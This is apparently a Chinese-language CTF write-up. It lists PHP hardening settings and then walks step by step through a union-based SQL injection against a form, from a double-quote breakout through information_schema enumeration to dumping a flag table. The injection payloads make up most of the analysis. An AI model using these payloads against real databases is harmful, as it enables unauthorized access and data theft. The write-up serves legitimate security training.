0X01环境搭建

  • chattr禁止文件内容被篡改

  • PHP.ini中

  1. 设置文件路径不可读（避免目录泄露）

  2. 设置文件执行权限在www/html目录下

  3. allow_url_fopen Off

  4. allow_url_include Off

0x02题目解析

首先看源码是一个表单，输入框存在注入。

单引号测试不行，双引号测试成功

" order by 2#


测试长度为2，继续查询数据库。

" union select database(),2#


得到数据库后联合查询表名。

" union select table_name,2 from information_schema.tables where table_schema="ctf1001"#

字段名

" union select column_name,2 from information_schema.columns where table_name="flag1"#


内容

" union select *,2 from flag1 #
